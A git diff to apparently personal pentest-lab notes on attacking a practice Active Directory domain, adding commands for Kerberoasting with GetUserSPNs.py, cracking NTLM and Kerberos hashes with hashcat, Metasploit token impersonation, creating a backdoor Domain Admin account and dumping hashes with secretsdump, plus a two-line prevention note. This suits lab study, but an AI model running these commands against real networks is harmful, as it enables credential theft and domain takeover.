@@ -492,6 +492,62 @@ secretsdump.py MARVEL.local/fcastle:'Password1'@{ip}
 <img width="1089" height="657" alt="image" src="https://github.com/user-attachments/assets/57cacd4a-d264-42e3-8721-e65d317ec76d" />
 secretsdump.py administrator:@192.168.1.63 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
 
+hashcat -m 1000 ntlm.txt /usr/share/wordlist.txt/rockyou.txt --force
+
+### KErboroasting
+
+sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip {domainip} -request
+retrieves kerberos hash
+
+
+hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt --force
+<img width="1682" height="189" alt="image" src="https://github.com/user-attachments/assets/3bb36aab-cb03-40e0-ad70-b7700bb322d8" />
+
+KERB PREVENTION
+
+strongpasswords
+service account should not be domain admins
+
+
+###Tokens
+
+msfconsole
+search psexec
+use 24
+
+(on victim machine have to turn off virus protection lol)
+<img width="593" height="168" alt="image" src="https://github.com/user-attachments/assets/de713077-d522-42b3-9aaf-9b1c518f5c11" />
+
+load incognito
+list_tokens -u 
+list_tokens -g
+
+impersonate_token marvel\\fcastle
+shell
+<img width="560" height="212" alt="image" src="https://github.com/user-attachments/assets/d771f102-3740-45ae-b757-1c741501a16b" />
+
+TO REVERT impersonation
+rev2self
+getuid
+<img width="509" height="205" alt="image" src="https://github.com/user-attachments/assets/f5db26db-ab0f-4673-a475-8fb9973f8d6d" />
+
+sign into marvel administrator (Only possible when user signs out and back in as admin)
+<img width="572" height="594" alt="image" src="https://github.com/user-attachments/assets/4be8bbea-3b96-447f-8a0b-723ba422360a" />
+list_tokens -u
+<img width="515" height="456" alt="image" src="https://github.com/user-attachments/assets/53f70c71-a4eb-485d-8f6b-439cd2de2a53" />
+
+net user /add hawkeye Password1@ /domain
+<img width="515" height="456" alt="image" src="https://github.com/user-attachments/assets/81d439d6-5066-4b73-acdd-0d00db3ad48d" />
+net group "Domain Admins" hawkeye /ADD /DOMAIN
+
+test with a secrets dump
+secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.1.65
+<img width="857" height="411" alt="image" src="https://github.com/user-attachments/assets/f949c14b-4277-4ad9-9b21-684ea9bc7ce6" />
+
+<img width="389" height="170" alt="image" src="https://github.com/user-attachments/assets/3af48806-b64d-4dcd-965b-3e222034c7e9" />
+
+
+
 
 
 
